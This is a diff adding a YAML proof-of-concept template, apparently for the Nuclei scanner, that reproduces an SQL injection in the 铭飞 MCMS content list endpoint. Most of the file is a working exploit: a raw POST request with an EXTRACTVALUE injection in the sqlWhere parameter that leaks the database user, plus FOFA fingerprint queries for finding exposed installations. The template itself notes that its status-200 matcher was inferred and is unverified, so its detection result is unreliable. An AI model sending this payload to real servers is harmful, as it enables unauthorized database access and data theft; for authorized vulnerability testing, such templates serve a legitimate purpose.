@@ -1,0 +1,33 @@
+id: poc-xzwhzn8mziv3h8qu
+info:
+  name: 铭飞CMS-list-SQL注入漏洞复现
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xzwhzn8mziv3h8qu
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xzwhzn8mziv3h8qu
+    fofa: FOFA：body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.0.0/ms.js"
+http:
+- raw:
+  - 'POST /cms/content/list.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept-Encoding: gzip, deflate, br
+
+    sqlWhere=[{"action"%3a"","field"%3a"1+AND+EXTRACTVALUE(4095,CONCAT(0x7e,(select user()),0x7e))","el":"eq","model":"contentTitle","name":"123","type":"input","value":"a"}]'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
